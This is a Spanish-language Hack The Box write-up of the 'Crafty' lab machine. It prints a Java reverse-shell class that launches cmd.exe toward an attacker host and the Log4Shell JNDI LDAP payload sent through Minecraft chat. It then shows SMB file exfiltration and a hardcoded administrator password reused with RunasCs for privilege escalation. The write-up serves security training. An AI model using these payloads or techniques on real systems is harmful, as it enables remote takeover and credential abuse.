---
layout: post
title: HTB Crafty
date: '2024-02-11 13:29:14 -0500'
categories: [HTB, Easy]
tags: [Web, CVE, Windows, RCE, Minecraft , Log4Shell , Runas, Plugins ,RunasCS, HardcodeCreds , LDAP , HTTP ,  Enumeration , Jar , Reversing ] 
image:
  path: /crafty/preview.png
  alt: Crafty
---

## Resumen
![logo](/crafty/logo.png){: .right w="200" h="200" }

**Crafty** es una máquina en la que se puede practicar una vulnerabilidad algo vieja pero que nunca está de más tener en cuenta. Para empezar, se pueden ver dos puertos dentro de la máquina: uno para una web y otro que parece ser un servidor de Minecraft. Dentro de la web, todo nos señala que debemos conectarnos para jugar. Después de investigar un poco, aparece la conocida vulnerabilidad **log4shell**, que permite ganar un **RCE** dentro de la máquina para convertirlo en una **shell reversa**. Para explotarlo, es necesario descargar **TLauncher** y así conectarse al servidor para intentar inyectar un comando dentro del chat de Minecraft usando algunos exploits de GitHub. Gracias a esto, se gana acceso al equipo. Luego, para escalar privilegios, hay que revisar la información relacionada con los **plugins** y se ve un archivo **JAR**. Al decompilarlo, se puede ver una contraseña en texto plano que puede pertenecer al usuario **administrador**. Por lo que se prueba hacer uso de **RunasCS** para ejecutar un comando como este usuario y comprometer totalmente el equipo. Esta máquina fue interesante de atacar, ya que se practicó una vulnerabilidad no tan reciente pero interesante, por lo que me divertí bastante haciéndola.

## Reconocimiento

Para empezar, se realiza un **ping** para saber si se cuenta con **conectividad** con la máquina.

```bash
ping 10.129.230.168 -c 1
PING 10.129.230.168 (10.129.230.168) 56(84) bytes of data.
64 bytes from 10.129.230.168: icmp_seq=1 ttl=127 time=159 ms

--- 10.129.230.168 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 158.746/158.746/158.746/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos

Ahora se puede realizar un escaneo de puertos con **nmap** para ver qué **puertos** se encuentran **abiertos** dentro de la máquina. Esto gracias al siguiente comando:

```bash
nmap -p- --min-rate 3000 10.129.230.168 -Pn  -oG TCPports

Nmap scan report for 10.129.230.168 (10.129.230.168)
Host is up (0.16s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft
```
{: .nolineno}

Conocidos los **puertos abiertos**, podemos realizar un escaneo más exhaustivo para identificar las **tecnologías** y las **versiones** que se están utilizando dentro del servidor.

```bash
nmap -p80,25565 -sVC  --min-rate 2000 10.129.230.168 -Pn  -oN versions

Nmap scan report for 10.129.230.168 (10.129.230.168)
Host is up (0.31s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
{: .nolineno}


## Enumeración 


Teniendo en cuenta que el servidor cuenta con un puerto web y un puerto relacionado con Minecraft, se va a iniciar con la página web, ya que es un servicio más común.

### Web

Al ingresar en la web, se ve que los recursos se encuentran registrados dentro de un dominio, por lo que es necesario registrar este mismo dentro del archivo `/etc/hosts`.

![webfail](/crafty/failweb.png)

```bash
127.0.0.1   localhost
127.0.1.1   kali
::1     localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters

#others
10.129.220.158 crafty.htb
```
{: .nolineno file="/etc/host"}

Y al ingresar en la web se puede ver un servicio que está relacionado con **Minecraft**, y dentro de la información importante se encuentra un **subdominio** que está registrado.

![web](/crafty/web.png)


Al dar clic en los **botones** que hay dentro de la **web**, se puede ver una nueva página en donde dice "**coming-soon**", pero más allá no se puede ver ninguna **información importante**.

![coming](/crafty/coming.png)

Como no se encuentra ninguna otra **información importante**, se puede hacer uso de **whatweb** para enumerar las **tecnologías** y las **versiones** que está utilizando la **web**.

```bash
whatweb 'http://10.129.230.168'

http://10.129.230.168 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.230.168], Microsoft-IIS[10.0], RedirectLocation[http://crafty.htb], Title[Document Moved]

http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.230.168], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
```
{: .nolineno}


### Minecraft

Por el lado del servidor de **Minecraft**, se busca información sobre la **versión**, para ver qué tan antigua es y si tiene alguna **vulnerabilidad asociada**.

![versionmine](/crafty/versionmine.png)

Y al investigar un poco, se encuentra una **vulnerabilidad** llamada **log4shell** que le permite al atacante ejecutar comandos dentro del servidor, lo cual permite ganar una **shell reversa** dentro del equipo.

![busqueda](/crafty/busqueda.png)

![quees](/crafty/quees.png)


## Explotación

Para realizar el **ataque**, es necesario contar con alguna manera de abrir **Minecraft** en la **versión específica**. Por lo tanto, se puede hacer con ayuda de **TLauncher**.

```bash
java -jar TLauncher-2.895.jar
```
{: .nolineno}

Una vez que se cuente con este, es necesario añadir un **nombre de usuario** y escoger la **versión 1.16.5**, que es la versión que muestra nmap al realizar el escaneo.

![tlauncher](/crafty/tlauncher.png)

Luego, se debe ingresar a la opción de **multijugador** y configurar el servidor con la **IP de la máquina** para poder conectarse al mismo.


![multi](/crafty/multi.png)

![server](/crafty/config.png)

![configserver](/crafty/configserver.png)


Por último, solo queda seleccionar el servidor y conectarse dándole clic.


![unirse](/crafty/unirse.png)

Por otro lado, para realizar el ataque se hace uso del repositorio de [**kozmer**](https://github.com/kozmer/log4j-shell-poc), en donde se indica que se debe contar con la versión de **Java** [`jdk1.8.0_20`](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html), por lo que se debe descargarla y ubicarla con el nombre indicado.


```bash
 tar -xf jdk-8u20-linux-x64.tar.gz
```
{: .nolineno}


```bash
mv  jdk-8u20-linux-x64 jdk1.8.0_20
 ```
{: .nolineno}

Al realizar esta **configuración**, solo queda **lanzar** el **ataque**. Sin embargo, es necesario tener en cuenta que se debe realizar una **configuración previa** dentro del **script** de **Python**. Esto se debe a que está lanzando un `/bin/bash` dentro del equipo, pero como la máquina es un **Windows**, esto se debe cambiar por `cmd.exe` o `powershell.exe`.

```python
#!/usr/bin/env python3

program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    # writing the exploit to Exploit.java file
```
{: file="poc.py"}


Después de esto, solo hace falta ejecutar el **script** indicando el **puerto** que quiero usar para el servidor web para exponer la **shell reversa** y el **puerto** al que quiero que me llegue la conexión.

```bash
python3 poc.py --userip 10.10.14.5 --webport 8000 --lport 9000

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.5:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

Luego, hay que ponerse a la escucha con `nc` en el **puerto** indicado.

```bash
nc -lvp 4444
```
{: .nolineno}

Con todo preparado, solo hace falta copiar y pegar el **payload** generado por el **exploit** dentro del chat de **Minecraft** y esperar que llegue la **shell reversa**.

```bash
${jndi:ldap://10.10.14.5:1389/a}
```
{: .nolineno}

![minecraft](/crafty/minecraft.png)


```bash
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.14.11:8000/Exploit.class
10.129.216.16 - - [11/Feb/2024 22:29:30] "GET /Exploit.class HTTP/1.1" 200 -
```
{: .nolineno}


Y si todo se realizó de forma adecuada, se ganará una **shell** dentro de la máquina con la que se puede intentar **escalar privilegios**.

```bash
nc -lvp 9000
listening on [any] 9000 ...
connect to [10.10.14.11] from 10.129.216.16 [10.129.216.16] 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>whoami
whoami
crafty\svc_minecraft
```
{: .nolineno}



## Escalada de Privilegios

Al revisar qué archivos hay dentro del servidor al ganar acceso al mismo, se pueden ver algunos interesantes, como lo son la **flag de usuario**. Además de esos, hay **logs**, **versiones**, **plugins** e información de usuarios.

```bash
c:\users\svc_minecraft\server>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\users\svc_minecraft\server

10/26/2023  05:37 PM    <DIR>          .
10/26/2023  05:37 PM    <DIR>          ..
11/14/2023  10:00 PM                 2 banned-ips.json
11/14/2023  10:00 PM                 2 banned-players.json
10/24/2023  12:48 PM               183 eula.txt
02/11/2024  09:24 AM    <DIR>          logs
11/14/2023  11:22 PM                 2 ops.json
10/27/2023  01:48 PM    <DIR>          plugins
10/24/2023  12:43 PM        37,962,360 server.jar
11/14/2023  10:00 PM             1,130 server.properties
02/11/2024  07:29 PM               106 usercache.json
10/24/2023  12:51 PM                 2 whitelist.json
02/11/2024  07:25 PM    <DIR>          world
               8 File(s)     37,963,787 bytes
               5 Dir(s)   3,253,649,408 bytes free
```
{: .nolineno}

Al revisar los **plugins** que hay para el servidor, se ve uno con un nombre interesante. Por lo que se puede intentar traerlo a la máquina atacante para analizarlo.

```bash
c:\Users\svc_minecraft\server\plugins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  01:48 PM    <DIR>          .
10/27/2023  01:48 PM    <DIR>          ..
10/27/2023  01:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,253,649,408 bytes free
```
{: .nolineno}

Para transferirlo, se monta un servidor **SMB** con ayuda de **Impacket** para que se pueda subir el archivo al mismo.

```bash
sudo impacket-smbserver share -smb2support .

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno}

Pero parece haber un problema debido a las políticas, en donde no se puede realizar acciones como un usuario no autenticado dentro del servidor.

```bash
c:\Users\svc_minecraft\server\plugins>copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.11\share   
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
        0 file(s) copied.
```
{: .nolineno}

Para esto mismo, se opta por la opción de ponerle **credenciales** al servidor.

```bash
sudo impacket-smbserver share -smb2support . -user madlies -password madlies
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno}

Se le indica al servidor que lo reconozca como una nueva montura haciendo uso de las **credenciales** que se le asignaron anteriormente.

```bash
net use n: \\10.10.14.11\share /user:madlies madlies
```
{: .nolineno}

Y se transfiere el archivo de forma satisfactoria.

```bash
c:\Users\svc_minecraft\server\plugins>copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.11\share   
copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.11\share   
        1 file(s) copied.
```
{: .nolineno}


```bash
ls
 jdk1.8.0_20              Dockerfile      jdk-8u202-linux-x64.tar.gz       poc.py             structure
 target                   Exploit.class   LICENSE                          README.md         
 vulnerable-application   Exploit.java    playercounter-1.0-SNAPSHOT.jar  󰌠 requirements.txt  
```
{: .nolineno}


Ahora se puede hacer uso de **jd-gui** para decompilar el archivo y ver si hay algo interesante dentro de él.



```bash
jd-gui playercounter-1.0-SNAPSHOT.jar
```
{: .nolineno}

Al revisar el código, se puede ver que hay una función que recibe los parámetros: **host**, **puerto** y **contraseña**. Por lo que si se encuentra dónde se llama esa función, se puede encontrar una posible contraseña para algún usuario dentro de la máquina.

![rcon](/crafty/rcon.png)

Por lo que al encontrar la función **RCON**, se encuentra una posible contraseña.

![password](/crafty/password.png)

```bash
s67u84zKq8IXw
```
{: .nolineno}

Con todo esto, se puede hacer uso de la herramienta **RunasCS**, que sirve para ejecutar comandos como otro usuario dentro de la máquina si se cuenta con credenciales válidas. Por lo que se puede probar con estas credenciales para intentar ejecutar comandos como **Administrator**. Para descargar el binario directamente compilado, se puede hacer uso del repositorio **SharpCollection**.


![cs](/crafty/cs.png)


![runasCS](/crafty/runasCS.png)


Ahora nos movemos a una carpeta en donde se cuente con permisos de escritura, como lo es `C:\users\public`, y se transfiere el archivo mediante el servidor **SMB** que se creó anteriormente.


```bash
c:\Users\svc_minecraft\server\plugins>cd C:\users\public
cd C:\users\public

C:\Users\Public>
```
{: .nolineno}

```bash
C:\Users\Public>copy \\10.10.14.11\share\csrunas.exe csrunas.exe
copy \\10.10.14.11\share\csrunas.exe csrunas.exe
        1 file(s) copied.

C:\Users\Public>
```
{: .nolineno}

El uso de **RunasCS** es el siguiente:

```bash
Usage:
    RunasCs.exe username password "cmd /c whoami"
```
{: .nolineno}


Por lo que, para nuestro caso, se puede ejecutar el siguiente comando para probar las credenciales del usuario:

```bash
C:\Users\Public>.\csrunas.exe Administrator s67u84zKq8IXw  "cmd /c whoami"

crafty\administrator
```
{: .nolineno}

Gracias a esto, se puede ejecutar comandos como **Administrador** dentro de la máquina, por lo que ya se puede hacer cualquier cosa. Entre las opciones se puede ver la **flag de root**.


```bash
C:\Users\Public>.\csrunas.exe Administrator s67u84zKq8IXw  "cmd /c dir C:\users\Administrator\desktop"

 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\users\Administrator\desktop

02/05/2024  06:05 AM    <DIR>          .
02/05/2024  06:05 AM    <DIR>          ..
02/11/2024  09:23 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,110,182,912 bytes free
```
{: .nolineno}



